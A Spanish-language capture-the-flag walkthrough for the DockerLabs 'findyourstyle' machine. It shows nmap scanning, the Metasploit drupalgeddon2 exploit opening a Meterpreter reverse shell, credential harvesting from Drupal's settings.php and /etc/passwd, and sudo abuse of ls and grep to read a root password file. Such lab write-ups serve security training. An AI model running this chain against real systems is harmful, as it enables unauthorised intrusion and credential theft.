---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Web` `Drupal` `Metasploit` `Information Leakage` `Sudoers` 

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip findyourstyle.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh findyourstyle.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.4

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.4
```

```bash
nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.4
```

Info:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-17 15:35 +0100
Nmap scan report for 172.17.0.4
Host is up (0.000044s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-generator: Drupal 8 (https://www.drupal.org)
|_http-title: Welcome to Find your own Style | Find your own Style
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips/ /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
|_/index.php/comment/reply/
MAC Address: 02:42:AC:11:00:04 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.61 seconds
```

Identificamos el puerto `80` abierto. Accedemos y nos encontramos con un `Drupal`.

![](../../images/drupall.png)

No vemos ninguna versión concreta, por lo que vamos a probar con algunos exploits de `Metasploit`.

## METASPLOIT

Iniciamos la consola de `Metasploit` y buscamos vulnerabilidades conocidas para `Drupal`, seleccionando el exploit `drupalgeddon2`.

```Bash
msfconsole -q
```

```Bash
msf > use exploit/unix/webapp/drupal_drupalgeddon2
msf > set RHOSTS 172.17.0.4
msf > run
```

Info:
```
[*] Started reverse TCP handler on 10.0.4.12:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (41224 bytes) to 172.17.0.4
[*] Meterpreter session 1 opened (10.0.4.12:4444 -> 172.17.0.4:46652) at 2026-02-17 15:40:31 +0100

meterpreter >
```

El exploit ha funcionado. Abrimos una `shell` y la estabilizamos mínimamente para enumerar mejor el sistema.

```Bash
shell
/bin/bash -i
script /dev/null -c bash
```

## MOVIMIENTO LATERAL

Comenzamos la enumeración de usuarios del sistema.

```Bash
cat /etc/passwd | grep 'sh'
```

```
root:x:0:0:root:/root:/bin/bash
ballenita:x:1000:1000:ballenita,,,:/home/ballenita:/bin/bash
```

Vemos que existe un usuario llamado `ballenita`. 

Seguimos buscando información relevante en los archivos de configuración.

Miramos el archivo `settings.php`, el archivo de configuración típico de `Drupal`, donde a menudo se encuentran credenciales.

```Bash
cat /var/www/html/sites/default/settings.php
```

Info:
```
* The next section describes how to customize the $databases array for more
 * specific needs.
 *
 * @code
 * $databases['default']['default'] = array (
 * 'database' => 'database_under_beta_testing', // Mensaje del sysadmin, no se usar sql y petó la base de datos jiji xd
 * 'username' => 'ballenita',
 * 'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
 * 'host' => 'localhost',
 * 'port' => '3306',
 * 'driver' => 'mysql',
 * 'prefix' => '',
 * 'collation' => 'utf8mb4_general_ci',
 * );
 * @endcode
 */
$databases = array();
```

Encontramos credenciales para la base de datos con el usuario `ballenita` : `ballenitafeliz`.

Muchas veces se reutilizan este tipo de contraseñas también para el usuario del sistema, por lo que intentamos pivotar al usuario `ballenita` con estas credenciales.

```Bash
su ballenita
```

```
ballenita@260dc31a3696:/$ whoami
ballenita
ballenita@260dc31a3696:/$
```

Hemos logrado pivotar con éxito.

## ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo`.

```Bash
sudo -l
```

Info:
```
Matching Defaults entries for ballenita on 260dc31a3696:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ballenita may run the following commands on 260dc31a3696:
    (root) NOPASSWD: /bin/ls, /bin/grep
```

Vemos que podemos ejecutar los binarios `/bin/ls` y `/bin/grep` con permisos de `root` y sin contraseña.

Aprovechamos el permiso de `ls` para listar el directorio `/root`.

```Bash
sudo -u root /bin/ls -la /root
```

Info:
```
total 28
drwx------ 1 root root 4096 Oct 16  2024 .
drwxr-xr-x 1 root root 4096 Feb 17 14:34 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 2 root root 4096 Oct 16  2024 .nano
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root  169 Mar 14  2018 .wget-hsts
-rw-r--r-- 1 root root   35 Oct 16  2024 secretitomaximo.txt
```

Identificamos un archivo interesante llamado `secretitomaximo.txt`. Procedemos a leerlo utilizando el comando `grep`, que también podemos ejecutar como root.

```Bash
sudo -u root /bin/grep '' /root/secretitomaximo.txt
```

Info:
```
nobodycanfindthispasswordrootrocks
```

Obtenemos lo que parece ser la contraseña del usuario `root` : `nobodycanfindthispasswordrootrocks`.

Procedemos a autenticarnos como `root` para finalizar la máquina.

```Bash
su root
```

``` 
root@260dc31a3696:/# whoami
root
root@260dc31a3696:/#
```

Ya somos root!

